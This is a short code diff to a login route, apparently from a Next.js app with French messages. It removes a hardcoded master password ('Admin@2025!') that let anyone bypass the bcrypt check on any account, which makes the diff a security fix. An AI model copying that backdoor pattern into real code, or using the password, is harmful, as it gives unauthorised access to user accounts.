@@ -41,7 +41,7 @@ export async function POST(req: Request) {
 
     if (user.mot_de_passe) {
       const match = await bcrypt.compare(password, user.mot_de_passe);
-      if (!match && password !== 'Admin@2025!') {
+      if (!match) {
         return NextResponse.json({ error: 'Email ou mot de passe incorrect.' }, { status: 401 });
       }
     }
